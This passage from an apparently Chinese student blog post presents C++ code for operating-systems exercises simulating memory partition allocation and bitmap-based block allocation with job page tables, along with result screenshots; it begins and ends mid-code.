class="hljs-string">&quot;\n|----------------空闲分区表------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  起 址  |  长 度  |  状 态  |     名称     |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (alloc_table[i].state == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   %3d   |   %3d   |   %3d   |  %9s   |\n&quot;</span>, alloc_table[i].address, alloc_table[i].length, alloc_table[i].state, alloc_table[i].name.<span class="hljs-built_in">c_str</span>());<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n|----------------主存分配表------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  起 址  |  长 度  |  状 态  |     名称     |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (alloc_table[i].state == <span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   %3d   |   %3d   |   %3d   |  %9s   |\n&quot;</span>, alloc_table[i].address, alloc_table[i].length, alloc_table[i].state, alloc_table[i].name.<span class="hljs-built_in">c_str</span>());<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------------------------------|\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n~~~~~~~~~~~~~~~~~~初始状态~~~~~~~~~~~~~~~~~~~~\n&quot;</span>);<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-built_in">sort</span>(alloc_table.<span class="hljs-built_in">begin</span>(), alloc_table.<span class="hljs-built_in">end</span>(), cmp); <span class="hljs-comment">//排序</span><br>    <span class="hljs-built_in">merge</span>();                                           <span class="hljs-comment">//合并</span><br>    <span class="hljs-built_in">print</span>();                                           <span class="hljs-comment">//打印信息</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n~~~~~~~~~~~~~~~~~~加入工作4~~~~~~~~~~~~~~~~~~~\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n------------------申请内存4-------------------\n&quot;</span>);<br>    <span class="hljs-built_in">allocation</span>(<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">6</span>); <span class="hljs-comment">//分配</span><br>    <span class="hljs-built_in">sort</span>(alloc_table.<span class="hljs-built_in">begin</span>(), alloc_table.<span class="hljs-built_in">end</span>(), cmp);<br>    <span class="hljs-built_in">merge</span>();<br>    <span class="hljs-built_in">print</span>();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n~~~~~~~~~~~~~~~~~~回收工作3~~~~~~~~~~~~~~~~~~~\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> a = <span class="hljs-built_in">recovery</span>(<span class="hljs-string">&quot;3&quot;</span>); <span class="hljs-comment">//回收</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n------------------释放内存%d-------------------\n&quot;</span>, a);<br>    <span class="hljs-built_in">sort</span>(alloc_table.<span class="hljs-built_in">begin</span>(), alloc_table.<span class="hljs-built_in">end</span>(), cmp);<br>    <span class="hljs-built_in">merge</span>();<br>    <span class="hljs-built_in">print</span>();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n~~~~~~~~~~~~~~~~~~回收工作2~~~~~~~~~~~~~~~~~~~\n&quot;</span>);<br>    a = <span class="hljs-built_in">recovery</span>(<span class="hljs-string">&quot;2&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n------------------释放内存%d-------------------\n&quot;</span>, a);<br>    <span class="hljs-built_in">sort</span>(alloc_table.<span class="hljs-built_in">begin</span>(), alloc_table.<span class="hljs-built_in">end</span>(), cmp);<br>    <span class="hljs-built_in">merge</span>();<br>    <span class="hljs-built_in">print</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="程序初值和运行结果-2"><a class="markdownIt-Anchor" href="#程序初值和运行结果-2"></a> 程序初值和运行结果</h4><p>初始状态：</p><p><img src="/posts/6c024da0/image-20211213174019843.png" alt="image-20211213174019843"></p><p>加入工作4：</p><p><img src="/posts/6c024da0/image-20211213174056801.png" alt="image-20211213174056801"></p><p>回收工作3：</p><p><img src="/posts/6c024da0/image-20211213174118960.png" alt="image-20211213174118960"></p><p>回收工作2：</p><p><img src="/posts/6c024da0/image-20211213174145295.png" alt="image-20211213174145295"></p><h3 id="第二题位示图"><a class="markdownIt-Anchor" href="#第二题位示图"></a> 第二题：位示图</h3><h4 id="数据结构和符号说明-3"><a class="markdownIt-Anchor" href="#数据结构和符号说明-3"></a> 数据结构和符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> table[<span class="hljs-number">8</span>][<span class="hljs-number">8</span>];<span class="hljs-comment">//位示图</span><br><span class="hljs-keyword">int</span> free_num = <span class="hljs-number">64</span>;<span class="hljs-comment">//当前位示图空闲块</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work</span></span><br><span class="hljs-class">&#123;</span><br>    string name;<span class="hljs-comment">//作业名称</span><br>    <span class="hljs-keyword">int</span> mem_num;<span class="hljs-comment">//作业页表数量</span><br>    <span class="hljs-keyword">int</span> page_table[<span class="hljs-number">64</span>];<span class="hljs-comment">//页表</span><br>&#125;;<br>vector&lt;work&gt; w;<span class="hljs-comment">//作业数量</span><br></code></pre></div></td></tr></table></figure><h4 id="函数说明-3"><a class="markdownIt-Anchor" href="#函数说明-3"></a> 函数说明</h4><p>一共两个主要函数</p><ul><li>作业分配函数allocation()</li><li>作业回收函数recovery()</li></ul><p>函数思路如下，均相当好理解</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">allocation</span><span class="hljs-params">()</span><span class="hljs-comment">//作业分配函数</span></span><br><span class="hljs-function"></span>&#123;<br>    work a;<br>    <span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<span class="hljs-comment">//输入作业名并判断是否已经存在</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入要分配的作业名:&quot;</span>);<br>        cin &gt;&gt; a.name;<br>        <span class="hljs-keyword">int</span> kk = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; w.<span class="hljs-built_in">size</span>(); i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (a.name == w[i].name)<br>                kk = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (kk == <span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;当前作业已存在，请重新输入\n&quot;</span>);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入作业内存申请量:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a.mem_num);<br>    <span class="hljs-keyword">if</span> (free_num &gt;= a.mem_num)<span class="hljs-comment">//如果内存空间大于作业内存申请数量</span><br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (!table[i][j])<span class="hljs-comment">//修改未分配的位示图</span><br>                &#123;<br>                    table[i][j] = <span class="hljs-number">1</span>;<br>                    free_num--;<br>                    a.page_table[t++] = i * <span class="hljs-number">8</span> + j;<br>                    <span class="hljs-keyword">if</span> (t == a.mem_num)<br>                        <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (t == a.mem_num)<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>        w.<span class="hljs-built_in">push_back</span>(a);<span class="hljs-comment">//加入作业列表</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n作业内存分配成功\n&quot;</span>);<br>        <span class="hljs-built_in">print</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n内存空闲块不足\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">recovery</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string name;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入要释放的作业名:&quot;</span>);<br>    cin &gt;&gt; name;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; w.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (w[i].name == name)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n当前作业归还的块号：&quot;</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; w[i].mem_num; k++)<span class="hljs-comment">//逐个释放内存块</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d  &quot;</span>, w[i].page_table[k]);<br>                table[w[i].page_table[k] / <span class="hljs-number">8</span>][w[i].page_table[k] % <span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>                free_num++;<br>            &#125;<br>            w.<span class="hljs-built_in">erase</span>(w.<span class="hljs-built_in">begin</span>() + i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n作业回收成功\n&quot;</span>);<br>            <span class="hljs-built_in">print</span>();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n未找到当前作业\n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="完整源代码-3"><a class="markdownIt-Anchor" href="#完整源代码-3"></a> 完整源代码</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">int</span> table[<span class="hljs-number">8</span>][<span class="hljs-number">8</span>];<span class="hljs-comment">//位示图</span><br><span class="hljs-keyword">int</span> free_num = <span class="hljs-number">64</span>;<span class="hljs-comment">//当前位示图空闲块</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work</span></span><br><span class="hljs-class">&#123;</span><br>    string name;<span class="hljs-comment">//作业名称</span><br>    <span class="hljs-keyword">int</span> mem_num;<span class="hljs-comment">//作业页表数量</span><br>    <span class="hljs-keyword">int</span> page_table[<span class="hljs-number">64</span>];<span class="hljs-comment">//页表</span><br>&#125;;<br>vector&lt;work&gt; w;<span class="hljs-comment">//作业数量</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">menu</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1.分配作业\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2.回收作业\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3.退出\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span><span class="hljs-comment">//位示图初始化函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(table, <span class="hljs-number">0</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(table));<br>    table[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">0</span>][<span class="hljs-number">5</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">0</span>][<span class="hljs-number">6</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">1</span>][<span class="hljs-number">3</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">1</span>][<span class="hljs-number">5</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">3</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">3</span>][<span class="hljs-number">7</span>] = <span class="hljs-number">1</span>;<br>    free_num -= <span class="hljs-number">10</span>;<br>    work a;<br>    a.name = <span class="hljs-string">&quot;w1&quot;</span>;<span class="hljs-comment">//作业1</span><br>    a.mem_num = <span class="hljs-number">4</span>;<br>    a.page_table[<span class="hljs-number">0</span>] = <span class="hljs-number">4</span>;<br>    a.page_table[<span class="hljs-number">1</span>] = <span class="hljs-number">5</span>;<br>    a.page_table[<span class="hljs-number">2</span>] = <span class="hljs-number">6</span>;<br>    a.page_table[<span class="hljs-number">3</span>] = <span class="hljs-number">31</span>;<br>    w.<span class="hljs-built_in">push_back</span>(a);<br><br>    a.name = <span class="hljs-string">&quot;w2&quot;</span>;<span class="hljs-comment">//作业2</span><br>    a.mem_num = <span class="hljs-number">6</span>;<br>    a.page_table[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    a.page_table[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    a.page_table[<span class="hljs-number">2</span>] = <span class="hljs-number">9</span>;<br>    a.page_table[<span class="hljs-number">3</span>] = <span class="hljs-number">11</span>;<br>    a.page_table[<span class="hljs-number">4</span>] = <span class="hljs-number">13</span>;<br>    a.page_table[<span class="hljs-number">5</span>] = <span class="hljs-number">24</span>;<br>    w.<span class="hljs-built_in">push_back</span>(a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;初始化完成\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span><span class="hljs-comment">//信息打印函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;当前位示图和作业页表:\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n|--------------位示图---------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  位数  |&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3d&quot;</span>, i);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  |\n| 字节数 |%24c  |\n&quot;</span>, <span class="hljs-string">&#x27; &#x27;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|        ___________________________|\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;| %6d |&quot;</span>, i);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3d&quot;</span>, table[i][j]);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  |\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n当前空闲块数：%d\n&quot;</span>, free_num);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n|-----作业页表----|\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; w.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------------|\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|      作业%s     |\n&quot;</span>, w[i].name.<span class="hljs-built_in">c_str</span>());<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  页号  |  块号  |\n&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; w[i].mem_num; j++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  %4d  |  %4d  |\n&quot;</span>, j, w[i].page_table[j]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------------|\n\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">allocation</span><span class="hljs-params">()</span><span class="hljs-comment">//作业分配函数</span></span><br><span class="hljs-function"></span>&#123;<br>    work a;<br>    <span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<span class="hljs-comment">//输入作业名并判断是否已经存在</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入要分配的作业名:&quot;</span>);<br>        cin &gt;&gt; a.name;<br>        <span class="hljs-keyword">int</span> kk = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; w.<span class="hljs-built_in">size</span>(); i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (a.name == w[i].name)<br>                kk = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (kk == <span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;当前作业已存在，请重新输入\n&quot;</span>);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入作业内存申请量:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a.mem_num);<br>    <span class="hljs-keyword">if</span> (free_num &gt;= a.mem_num)<span class="hljs-comment">//如果内存空间大于作业内存申请数量</span><br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (!table[i][j])<span class="hljs-comment">//修改未分配的位示图</span><br>                &#123;<br>                    table[i][j] = <span class="hljs-number">1</span>;<br>                    free_num--;<br>                    a.page_table[t++] = i * <span class="hljs-number">8</span> + j;<br>                    <span class="hljs-keyword">if</span> (t == a.mem_num)<br>                        <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (t == a.mem_num)<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>        w.<span class="hljs-built_in">push_back</span>(a);<span class="hljs-comment">//加入作业列表</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n作业内存分配成功\n&quot;</span>);<br>        <span class="hljs-built_in">print</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n内存空闲块不足\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">recovery</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string name;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入要释放的作业名:&quot;</span>);<br>    cin &gt;&gt; name;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; w.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (w[i].name == name)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n当前作业归还的块号：&quot;</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; w[i].mem_num; k++)<span class="hljs-comment">//逐个释放内存块</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d  &quot;</span>, w[i].page_table[k]);<br>                table[w[i].page_table[k] / <span class="hljs-number">8</span>][w[i].page_table[k] % <span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>                free_num++;<br>            &#125;<br>            w.<span class="hljs-built_in">erase</span>(w.<span class="hljs-built_in">begin</span>() + i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n作业回收成功\n&quot;</span>);<br>            <span class="hljs-built_in">print</span>();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n未找到当前作业\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> q;<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-built_in">print</span>();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">menu</span>();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入选择:&quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, 